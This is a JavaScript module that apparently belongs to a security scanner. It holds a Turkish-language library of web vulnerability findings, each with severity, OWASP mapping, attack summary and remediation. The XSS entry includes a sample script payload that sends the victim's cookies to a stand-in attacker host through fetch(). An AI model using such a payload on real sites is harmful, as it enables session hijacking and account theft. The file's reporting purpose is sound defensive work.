/**
 * backend/utils/findingLibrary.js
 * 
 * ALFA X-RAY V3.0 — PROFESYONEL ZAFİYET KÜTÜPHANESİ
 * ------------------------------------------------
 * Bu kütüphane, "FAKE" metinler yerine her bir bulgu için 
 * akademik ve teknik düzeyde adli analiz verileri sağlar.
 */

export const FINDING_LIBRARY = {
  // ─── WEB GÜVENLİK BAŞLIKLARI ──────────────────────────────────────────
  "hsts": {
    title: "HTTP Strict Transport Security (HSTS) Politikası Eksikliği",
    severity: "Medium",
    cvss: 5.5,
    owasp: "A05:2021-Security Misconfiguration",
    description: "HSTS, web sitesinin tarayıcılara yalnızca HTTPS (güvenli) bağlantı üzerinden iletişim kurmasını emreden bir güvenlik mekanizmasıdır.",
    technical: "Sunucu yanıtında 'Strict-Transport-Security' başlığı bulunamadı. Bu durum, ilk bağlantının güvensiz HTTP üzerinden yapılmasına izin verir.",
    attack: "Saldırgan, 'SSL Stripping' yöntemini kullanarak kullanıcının HTTPS isteğini HTTP'ye düşürebilir ve araya girerek (MITM) verileri çalabilir.",
    impact: "Kullanıcı trafiği izlenebilir, oturum çerezleri ele geçirilebilir ve hassas veriler sızdırılabilir.",
    businessImpact: "ISO 27001 ve KVKK kapsamında 'Veri Gizliliği' ilkesinin ihlaline neden olur. Kurumsal itibar kaybı riski yüksektir.",
    remediation: "Web sunucusu konfigürasyonuna şu başlık eklenmelidir: \nStrict-Transport-Security: max-age=31536000; includeSubDomains; preload",
    references: ["https://cheatsheetseries.owasp.org/cheatsheets/HTTP_Strict_Transport_Security_Cheat_Sheet.html", "https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Strict-Transport-Security"]
  },
  "csp": {
    title: "Content Security Policy (CSP) Tanımlanmamış",
    severity: "High",
    cvss: 7.5,
    owasp: "A03:2021-Injection",
    description: "CSP, tarayıcının hangi kaynaklardan (JS, CSS, Resim) veri yükleyebileceğini belirleyen modern bir savunma katmanıdır.",
    technical: "İçerik Güvenlik Politikası (CSP) başlığı eksik. Tarayıcı, herhangi bir dış kaynaktan gelen scripti güvenilir kabul edecektir.",
    attack: "XSS (Cross-Site Scripting) saldırılarında, saldırganın zararlı scripti sayfada başarıyla çalıştırılmasına olanak tanır.",
    impact: "Kullanıcı hesaplarının ele geçirilmesi, phishing sayfalarının enjekte edilmesi veya veri çalınması.",
    businessImpact: "Finansal kayıplar ve kullanıcı güveninin sarsılması. Veri ihlali bildirim yükümlülüğü doğurur.",
    remediation: "Katı (Strict) bir CSP politikası uygulanmalıdır. Örn: Content-Security-Policy: default-src 'self'; script-src 'self' https://trusted.com;",
    references: ["https://csp-evaluator.withgoogle.com/", "https://owasp.org/www-community/controls/Content_Security_Policy"]
  },
  "x-frame-options": {
    title: "Clickjacking Koruması (X-Frame-Options) Eksikliği",
    severity: "Medium",
    cvss: 5.0,
    owasp: "A04:2021-Insecure Design",
    description: "X-Frame-Options, bir sitenin iframe içinde başka bir siteye gömülüp gömülemeyeceğini kontrol eder.",
    technical: "X-Frame-Options veya CSP 'frame-ancestors' başlığı tanımlanmamış. Site, kötü niyetli bir sayfa içine gömülebilir.",
    attack: "Saldırgan, hedef siteyi görünmez bir katman olarak kendi sitesinin üzerine koyar ve kullanıcıyı farkında olmadan butonlara tıklamaya zorlar.",
    impact: "Kullanıcının istem dışı işlem yapması (örn: şifre değiştirme, para transferi, silme işlemi).",
    businessImpact: "İşlemsel bütünlüğün bozulması ve kullanıcı manipülasyonu.",
    remediation: "X-Frame-Options: SAMEORIGIN başlığı eklenmelidir.",
    references: ["https://owasp.org/www-community/attacks/Clickjacking"]
  },

  // ─── SSL/TLS BULGULARI ────────────────────────────────────────────────
  "ssl_grade_f": {
    title: "Kritik SSL/TLS Güvenlik Zafiyeti (Grade F)",
    severity: "Critical",
    cvss: 9.8,
    owasp: "A02:2021-Cryptographic Failures",
    description: "Sertifika zincirinde veya şifreleme protokollerinde ölümcül hatalar tespit edildi.",
    technical: "Desteklenen TLS sürümleri çok eski (örn: SSLv3) veya sertifika süresi geçmiş. Modern tarayıcılar siteyi 'güvensiz' olarak işaretler.",
    attack: "Saldırganlar şifreli trafiği dakikalar içinde çözebilir veya sahte bir sertifika ile trafiği tamamen manipüle edebilir.",
    impact: "Tüm iletişim kanallarının şeffaf hale gelmesi. Veri gizliliğinin SIFIRlanması.",
    businessImpact: "PCI-DSS uyumsuzluğu, yasal cezalar ve sitenin erişime kapatılması riski.",
    remediation: "SSL sertifikasını yenileyin, TLS 1.0/1.1 desteğini kapatın ve yalnızca TLS 1.2+ sürümlerine izin verin.",
    references: ["https://www.ssllabs.com/projects/best-practices/", "https://cheatsheetseries.owasp.org/cheatsheets/Transport_Layer_Protection_Cheat_Sheet.html"]
  },

  // ─── AKTİF TARAMA BULGULARI (GPT ENTEGRASYONU) ─────────────────────────
  "xss_detected": {
    title: "Cross-Site Scripting (XSS) - Reflected",
    severity: "High",
    cvss: 8.2,
    owasp: "A03:2021-Injection",
    description: "Kullanıcıdan gelen girdinin (query params) temizlenmeden HTML sayfasına yansıtılması durumudur.",
    technical: "Uygulama, URL üzerinden gönderilen script bloklarını encode etmeden ekrana basmaktadır. DOM üzerinden müdahale mümkündür.",
    attack: "Saldırgan bir link oluşturur: internal-link.com?q=<script>fetch('attacker.com', {cookie: document.cookie})</script>",
    impact: "Kullanıcının kimlik bilgilerinin (Session ID) çalınması ve hesabın tam kontrolü.",
    businessImpact: "Müşteri verilerinin toplu sızıntısı ve KVKK ağır para cezaları.",
    remediation: "Input validation ve Output Encoding (HTML entity encoding) uygulanmalıdır.",
    references: ["https://owasp.org/www-community/attacks/xss/"]
  },
  "sqli_error": {
    title: "SQL Syntax Sızıntısı (Potansiyel SQL Injection)",
    severity: "Critical",
    cvss: 9.1,
    owasp: "A03:2021-Injection",
    description: "Veritabanı sorgu hatalarının kullanıcıya gösterilmesi veya girdilerin sorguyu kırmasıdır.",
    technical: "Özel karakterler (~, ', \") gönderildiğinde sunucu 'SQL syntax error' veya 'database exception' döndürmektedir.",
    attack: "Saldırgan veritabanı yapısını çözebilir, kullanıcı tablolarını çekebilir veya veritabanını silebilir.",
    impact: "Tam sistem uzlaşması, tüm müşteri ve finansal verilerin ele geçirilmesi.",
    businessImpact: "Firmanın ticari faaliyetlerinin durması ve kalıcı veri kaybı.",
    remediation: "Prepared Statements (Parameterized Queries) kullanılmalı, hata mesajları kullanıcıya gösterilmemelidir.",
    references: ["https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html"]
  },

  // ─── AĞ VE PORT BULGULARI ─────────────────────────────────────────────
  "open_database": {
    title: "Dışa Açık Kritik Veritabanı Portu (Port 3306/5432/27017)",
    severity: "Critical",
    cvss: 9.5,
    owasp: "A01:2021-Broken Access Control",
    description: "Veritabanı servisinin internet üzerinden doğrudan erişilebilir olması riskidir.",
    technical: "Zafiyet taraması sonucunda DB portunun (MySQL, MongoDB vb.) WAN üzerinde 'OPEN' olduğu tespit edildi.",
    attack: "Saldırganlar kaba kuvvet (Brute-force) veya varsayılan şifrelerle veritabanına doğrudan login olmayı deneyebilir.",
    impact: "Veritabanı içeriğinin tamamen indirilmesi (Data Dump) veya şifrelenmesi (Ransomware).",
    businessImpact: "Milyonlarca liralık veri ihlali davası ve kurumsal iflas riski.",
    remediation: "Veritabanı portları internete kapatılmalı, sadece güvenli VPN/Jump-host üzerinden erişim sağlanmalıdır.",
    references: ["https://cwe.mitre.org/data/definitions/668.html"]
  },
  "insecure_ftp": {
    title: "Güvensiz FTP Servisi (Port 21)",
    severity: "High",
    cvss: 7.0,
    owasp: "A02:2021-Cryptographic Failures",
    description: "Dosya aktarım protokolünün şifresiz olarak açık olmasıdır.",
    technical: "Port 21 açık. Veriler düz metin (Cleartext) olarak iletilmektedir.",
    attack: "Ağ üzerindeki bir saldırgan şifreleri ve aktarılan dosyaları koklayabilir (Sniffing).",
    impact: "Yönetici şifrelerinin ve hassas dosyaların çalınması.",
    businessImpact: "Fikri mülkiyet hırsızlığı ve veri sızıntısı.",
    remediation: "FTP yerine SFTP veya FTPS protokolüne geçiş yapılmalıdır.",
    references: ["https://owasp.org/index.php/Cleartext_Transmission_of_Sensitive_Information"]
  },

  // ─── YENİ V3.0 BULGULARI ─────────────────────────────────────────────
  "cors_misconfiguration": {
    title: "Hatalı CORS Yapılandırması (Cross-Origin Resource Sharing)",
    severity: "High",
    cvss: 7.1,
    owasp: "A05:2021-Security Misconfiguration",
    description: "Sunucunun, tarayıcı tabanlı erişim kontrol mekanizmasını (CORS) çok gevşek veya hatalı yapılandırmasıdır.",
    technical: "Sunucu yanıtında 'Access-Control-Allow-Origin' başlığı '*' (wildcard) olarak veya saldırganın kontrolündeki bir origin'i kabul edecek şekilde 'reflected' olarak tespit edildi.",
    attack: "Saldırgan, kullanıcının tarayıcısı üzerinden hedef siteye yetkili istekler göndererek hassas verileri (JSON yanıtları, API anahtarları) okuyabilir.",
    impact: "Kullanıcı gizliliğinin ihlali ve veri hırsızlığı.",
    businessImpact: "Veri sızıntısı nedeniyle KVKK uyumsuzluğu.",
    remediation: "Access-Control-Allow-Origin başlığı yalnızca güvenilen domainlere izin verecek şekilde (Whitelisting) yapılandırılmalıdır.",
    references: ["https://portswigger.net/web-security/cors", "https://owasp.org/www-community/attacks/CORS_Origin_Reflection"]
  },
  "insecure_cookies": {
    title: "Güvensiz Oturum Yönetimi (Insecure Cookies)",
    severity: "Medium",
    cvss: 5.0,
    owasp: "A07:2021-Identification and Authentication Failures",
    description: "Oturum çerezlerinin (cookies) güvenlik bayraklarının (HttpOnly, Secure, SameSite) eksik olmasıdır.",
    technical: "Sunucu tarafından set edilen çerezlerde HttpOnly veya Secure flag'leri bulunamadı.",
    attack: "HttpOnly eksikliği durumunda JavaScript (XSS) ile çerezler çalınabilir. Secure eksikliği durumunda çerezler şifresiz ağlarda ele geçirilebilir.",
    impact: "Oturum çalma (Session Hijacking) ve hesap ele geçirme.",
    businessImpact: "Kullanıcı hesap güvenliğinin riske atılması.",
    remediation: "Tüm kritik çerezlere 'HttpOnly; Secure; SameSite=Lax' bayrakları eklenmelidir.",
    references: ["https://owasp.org/www-community/HttpOnly", "https://developer.mozilla.org/en-US/docs/Web/HTTP/Cookies#security"]
  },
  "technology_exposure": {
    title: "Hassas Teknoloji İfşası (Information Disclosure)",
    severity: "Low",
    cvss: 3.3,
    owasp: "A05:2021-Security Misconfiguration",
    description: "Sunucu veya uygulama katmanındaki teknolojilerin ve sürümlerinin kamuya ifşa edilmesidir.",
    technical: "HTTP yanıt başlıklarında veya HTML kaynak kodunda 'X-Powered-By', 'Server' veya spesifik sürüm bilgileri (örn: WordPress 6.1) tespit edildi.",
    attack: "Saldırganlar, kullanılan teknolojilerin bilinen zafiyetlerini (CVE) araştırarak hedefli saldırılar (Exploitation) planlar.",
    impact: "Saldırı yüzeyinin genişlemesi ve hedefli keşif kolaylığı.",
    businessImpact: "Güvenlik duruşunun (Security Posture) zayıflaması.",
    remediation: "Sunucu ve uygulama başlıkları (Server, X-Powered-By) gizlenmeli veya jenerik değerlerle değiştirilmelidir.",
    references: ["https://owasp.org/www-project-top-ten/2017/A6_2017-Security_Misconfiguration"]
  },
  "ip_reputation_low": {
    title: "Düşük IP Reputasyonu (Malware/Phishing Geçmişi)",
    severity: "High",
    cvss: 7.2,
    owasp: "A00:2021-Operational Risk",
    description: "Hedef IP adresinin veya domainin daha önce kötü niyetli faaliyetlerde (botnet, phishing, spam) kullanıldığına dair kayıtlar bulunmasıdır.",
    technical: "Dış istihbarat kaynakları (AlienVault OTX vb.) üzerinden yapılan sorgulamada ilgili varlığın 'Malicious' olarak işaretlendiği görüldü.",
    attack: "Saldırganlar daha önce ele geçirilmiş bu altyapıyı kullanarak yeni saldırılar başlatabilir veya site kullanıcılarını kandırabilir.",
    impact: "E-postaların spam'e düşmesi, domainin kara listeye alınması ve kullanıcı güven kaybı.",
    businessImpact: "Ticari faaliyetlerin durması ve marka itibarının kalıcı hasar görmesi.",
    remediation: "Varlık üzerindeki kötü niyetli dosyalar temizlenmeli, sunucu güvenliği artırılmalı ve kara listelerden çıkış (delisting) talebi yapılmalıdır.",
    references: ["https://otx.alienvault.com/", "https://www.spamhaus.org/"]
  },
  "insecure_http": {
    title: "Hassas Veri İletimi Üzerinden Güvensiz Protokol (HTTP)",
    severity: "High",
    cvss: 7.5,
    owasp: "A02:2021-Cryptographic Failures",
    description: "Sitenin HTTPS yerine şifresiz HTTP protokolü üzerinden erişilebilir olması durumudur.",
    technical: "Sunucu 80 portu üzerinden istek kabul etmektedir ve zorunlu bir HTTPS yönlendirmesi tespit edilememiştir.",
    attack: "Saldırganlar şifresiz ağlarda (Ortadaki Adam saldırısı - MitM) kullanıcı verilerini kolayca koklayabilir.",
    impact: "Oturum çerezlerinin, şifrelerin ve kişisel verilerin açık metin olarak ele geçirilmesi.",
    businessImpact: "Müşteri güveninin kaybı ve KVKK veri güvenliği ihlali.",
    remediation: "Sunucuda 443 (HTTPS) yapılandırılmalı ve tüm HTTP istekleri 301 yönlendirmesi ile HTTPS'ye çekilmelidir.",
    references: ["https://owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure"]
  },
  "spf_missing": {
    title: "SPF (Sender Policy Framework) Kaydı Eksikliği",
    severity: "High",
    cvss: 6.5,
    owasp: "A04:2021-Insecure Design",
    description: "Domain üzerinden kimlerin e-posta gönderebileceğini belirten DNS kaydının bulunmamasıdır.",
    technical: "Hedef domain için geçerli bir SPF TXT kaydı bulunamadı.",
    attack: "Saldırganlar, kurum adını kullanarak sahte e-postalar (Phishing/Spoofing) göndererek çalışanları veya müşterileri kandırabilir.",
    impact: "Alan adı itibarının zedelenmesi ve yüksek başarılı phishing saldırıları.",
    businessImpact: "Marka kimlik hırsızlığı ve finansal dolandırıcılık riski.",
    remediation: "DNS ayarlarına 'v=spf1 include:_spf.google.com ~all' benzeri uygun bir SPF kaydı eklenmelidir.",
    references: ["https://en.wikipedia.org/wiki/Sender_Policy_Framework"]
  },
  "dmarc_missing": {
    title: "DMARC Politikası Yapılandırılmamış",
    severity: "High",
    cvss: 6.0,
    owasp: "A04:2021-Insecure Design",
    description: "E-posta güvenliğini artıran DMARC (Domain-based Message Authentication) kaydının eksik olmasıdır.",
    technical: "DNS sorgusunda '_dmarc' alt alan adı için herhangi bir politika kaydı tespit edilemedi.",
    attack: "SPF ve DKIM doğrulaması geçemeyen sahte e-postaların nasıl işleneceğine dair bir kural olmadığı için saldırılar engellenemez.",
    impact: "Domain üzerinden yapılan sahte e-posta gönderimlerinin alıcı sunucular tarafından kabul edilmesi.",
    businessImpact: "Kurumsal iletişim kanallarının güvensiz hale gelmesi.",
    remediation: "DNS ayarlarına en azından izleme modunda bir DMARC kaydı eklenmelidir (v=DMARC1; p=none;).",
    references: ["https://dmarc.org/"]
  },
  "exposed_sensitive_files": {
    title: "Kritik Sistem Dosyası İfşası (.env, .git)",
    severity: "Critical",
    cvss: 9.9,
    owasp: "A01:2021-Broken Access Control",
    description: "Sunucu üzerindeki gizli konfigürasyon dosyalarına veya kaynak kod geçmişine doğrudan erişilebilir olması durumudur.",
    technical: "Hedef domain üzerinde yapılan path probes sonucunda /.env veya /.git/config gibi dosyalara 200 OK yanıtı ile ulaşılabildiği tespit edildi.",
    attack: "Saldırganlar .env dosyasını indirerek veritabanı şifrelerini, API anahtarlarını ve gizli sertifikaları saniyeler içinde ele geçirebilir.",
    impact: "Tüm sistemin tam kontrolünün (Total Compromise) saldırganın eline geçmesi.",
    businessImpact: "Müşteri verilerinin toplu sızıntısı, kurumsal iflas riski ve KVKK kapsamında en ağır cezalar.",
    remediation: "Nginx/Apache konfigürasyonunda nokta ile başlayan dosyalara erişim yasaklanmalı veya bu dosyalar web root dizini dışına çıkarılmalıdır.",
    references: ["https://cwe.mitre.org/data/definitions/538.html", "https://owasp.org/www-project-top-ten/2017/A6_2017-Security_Misconfiguration"]
  }
};


